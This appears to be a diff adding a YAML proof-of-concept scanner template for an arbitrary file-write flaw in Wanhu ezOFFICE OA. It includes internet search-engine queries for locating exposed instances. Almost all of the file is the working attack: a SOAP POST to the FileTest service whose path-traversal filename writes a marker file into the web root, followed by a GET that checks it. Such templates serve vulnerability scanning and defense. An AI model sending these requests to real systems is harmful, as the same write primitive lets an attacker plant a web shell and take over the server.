@@ -1,0 +1,45 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: /defaultroot/public/upload/4ndex.txt  | 绝对路径 D:/jboss/jboss-as/server/oa/deploy/defaultroot.war/public/upload/4ndex.txt
+    
+name: poc-yaml-wanhu-ezoffice-FileTest-axis-upload
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /defaultroot/services/FileTest;1.js
+            headers:
+              Content-Disposition: attachment; filename="filename.jpg"
+              SOAPAction: 1
+              Content-Type: text/xml;charset=UTF-8
+            body: "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\r\nxmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\nxmlns:util=\"http://com.whir.ezoffice.ezform.util.StringUtil\"\r\nxmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n<util:printToFile\r\nsoapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n<fileName xsi:type=\"soapenc:string\">../server/oa/deploy/defaultroot.war/public/upload/4ndex.txt</fileName>\r\n<content xsi:type=\"soapenc:string\">&#x34;&#x72;&#x61;&#x31;&#x6e;</content>\r\n</util:printToFile>\r\n</soapenv:Body>\r\n</soapenv:Envelope>"            
+        expression: response.status == 200 && response.body_string.contains("xml version")  && response.body_string.contains("soapenv")
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/public/upload/4ndex.txt
+            headers:
+            body:   
+        expression: response.status == 200 && response.body_string.contains("4ra1n")
+
+
+expression: r0() && r1()
